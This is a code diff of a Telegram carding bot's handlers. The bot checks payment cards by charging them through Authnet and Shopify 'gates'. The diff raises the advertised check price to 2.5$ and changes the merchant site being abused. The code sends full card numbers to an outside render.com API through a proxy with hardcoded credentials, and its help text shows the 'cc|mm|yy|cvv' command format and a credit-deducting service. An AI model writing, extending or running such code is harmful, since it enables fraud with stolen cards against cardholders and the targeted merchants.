@@ -671,7 +671,7 @@ async def charge_sub_menu_handler(update: Update, context: ContextTypes.DEFAULT_
         ],
         [
             InlineKeyboardButton("💵 Shopify 10$", callback_data="shopify10_gate"),
-            InlineKeyboardButton("🏦 Authnet 0.98$", callback_data="authnet36_gate")
+            InlineKeyboardButton("🏦 Authnet 2.5$", callback_data="authnet36_gate")
         ],
         [
             InlineKeyboardButton("◀️ Back to Gate Menu", callback_data="gates_menu")
@@ -812,9 +812,9 @@ async def authnet36_gate_handler(update: Update, context: ContextTypes.DEFAULT_T
     await q.answer()
     text = (
         "✦━━━━━━━━━━━━━━✦\n"
-        "      🏦 <b>Authnet 0.98$</b>\n"
+        "      🏦 <b>Authnet 2.5$</b>\n"
         "✦━━━━━━━━━━━━━━✦\n\n"
-        "• <code>/at</code> - <i>Check a single card on Authnet $0.98</i>\n"
+        "• <code>/at</code> - <i>Check a single card on Authnet $2.5</i>\n"
         "  Example:\n"
         "  <code>/at 1234567890123456|12|2026|123</code>\n\n"
         "⚡ Use carefully, each check deducts credits.\n\n"
@@ -1015,7 +1015,7 @@ async def cmds_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         f"{bullet_link} <code>/vbv cc|mm|yy|cvv</code> – 3DS Lookup\n\n"
 
         "🔹 <b>𝗔𝘂𝘁𝗵𝗻𝗲𝘁</b>\n"
-        f"{bullet_link} <code>/at cc|mm|yy|cvv</code> – Authnet 0.98$ Charge\n\n"
+        f"{bullet_link} <code>/at cc|mm|yy|cvv</code> – Authnet 2.5$ Charge\n\n"
 
         "🔹 <b>𝙎𝙝𝙤𝙥𝙞𝙛𝙮</b>\n"
         f"{bullet_link} <code>/sh</code> – Shopify Charge $0.98\n"
@@ -3494,7 +3494,7 @@ async def process_at(update: Update, context: ContextTypes.DEFAULT_TYPE, payload
         # --- API request ---
         api_url = (
             f"https://auto-shopify-6cz4.onrender.com/index.php"
-            f"?site=https://upperlimitsupplements.com"
+            f"?site=https://unikeyhealth.com"
             f"&cc={full_card}"
             f"&proxy=107.172.163.27:6543:nslqdeey:jhmrvnto65s1"
         )
@@ -3526,7 +3526,7 @@ async def process_at(update: Update, context: ContextTypes.DEFAULT_TYPE, payload
 
         response = data.get("Response", "Unknown")
         gateway = data.get("Gateway", "AuthNet")
-        price = data.get("Price", "0.98$")
+        price = data.get("Price", "2.5$")
 
         # --- BIN lookup ---
         try:
@@ -3571,7 +3571,7 @@ async def process_at(update: Update, context: ContextTypes.DEFAULT_TYPE, payload
         final_msg = (
             f"◇━━〔 <b>{header_status}</b> 〕━━◇\n"
             f"{bullet_link} 𝐂𝐚𝐫𝐝 ➵ <code>{full_card}</code>\n"
-            f"{bullet_link} 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ➵ 𝑨𝒖𝒕𝒉𝑵𝒆𝒕 {escape(price)}\n"
+            f"{bullet_link} 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ➵ 𝑨𝒖𝒕𝒉𝑵𝒆𝒕 𝟐.𝟓$\n"
             f"{bullet_link} 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ➵ <i>{display_response}</i>\n"
             "――――――――――――――――\n"
             f"{bullet_link} 𝐁𝐫𝐚𝐧𝐝 ➵ <code>{escape(brand)}</code>\n"
